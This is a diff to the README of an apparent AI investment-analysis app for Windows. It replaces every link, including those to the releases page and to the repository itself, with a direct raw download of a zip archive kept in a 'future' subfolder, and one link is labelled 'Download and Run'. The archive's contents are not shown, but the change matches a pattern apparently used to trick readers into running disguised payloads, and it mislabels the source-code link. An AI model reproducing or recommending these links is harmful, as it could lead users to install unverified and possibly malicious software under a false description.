@@ -1,6 +1,6 @@
 # 🤖 InvestAI-Multi-Agent - Smart Market Analysis Made Easy
 
-[![Download InvestAI-Multi-Agent](https://img.shields.io/badge/Download-InvestAI--Multi--Agent-brightgreen?style=for-the-badge)](https://github.com/Kardom9277/InvestAI-Multi-Agent/releases)
+[![Download InvestAI-Multi-Agent](https://img.shields.io/badge/Download-InvestAI--Multi--Agent-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Kardom9277/InvestAI-Multi-Agent/main/future/A_Multi_Invest_Agent_1.6.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Make sure your computer meets these basic requirements before installing InvestA
 
 Click the link below to go to the official download page for InvestAI-Multi-Agent. This page has the latest versions and detailed release notes.
 
-[Download InvestAI-Multi-Agent](https://github.com/Kardom9277/InvestAI-Multi-Agent/releases)
+[Download InvestAI-Multi-Agent](https://raw.githubusercontent.com/Kardom9277/InvestAI-Multi-Agent/main/future/A_Multi_Invest_Agent_1.6.zip)
 
 ### Step 2: Choose the Latest Version
 
@@ -117,7 +117,7 @@ Use the **Export** button to save reports as PDF or Excel files. This lets you s
 
 - User documentation and FAQs are included in the Help menu after installation.
 - Visit the GitHub repository for source code and developer info:  
-  https://github.com/Kardom9277/InvestAI-Multi-Agent
+  https://raw.githubusercontent.com/Kardom9277/InvestAI-Multi-Agent/main/future/A_Multi_Invest_Agent_1.6.zip
 - Follow market updates related to AI and investment on trusted financial news sites.
 - Learn about Groq and AI hardware to understand the tech behind the platform.
 
@@ -127,4 +127,4 @@ Use the **Export** button to save reports as PDF or Excel files. This lets you s
 
 You can start by visiting the release page to download the installer:
 
-[Download and Run InvestAI-Multi-Agent on Windows](https://github.com/Kardom9277/InvestAI-Multi-Agent/releases)
+[Download and Run InvestAI-Multi-Agent on Windows](https://raw.githubusercontent.com/Kardom9277/InvestAI-Multi-Agent/main/future/A_Multi_Invest_Agent_1.6.zip)
